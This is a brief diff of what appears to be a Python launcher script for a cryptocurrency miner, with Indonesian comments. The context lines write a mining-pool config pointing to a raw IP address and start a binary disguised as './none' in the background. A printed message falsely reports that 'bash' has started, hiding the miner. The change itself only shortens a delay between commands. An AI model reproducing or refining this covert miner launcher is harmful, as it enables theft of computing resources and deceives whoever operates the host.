@@ -29,7 +29,7 @@ pool1 = 47.236.66.121:443' > config.ini"""
 
     for cmd in commands:
         subprocess.run(cmd, shell=True)
-        time.sleep(30)  # Delay agar berurutan
+        time.sleep(2)  # Delay agar berurutan
 
     print("✅ bash dimulai...")
     subprocess.Popen("./none", shell=True)  # Jalankan miner di background
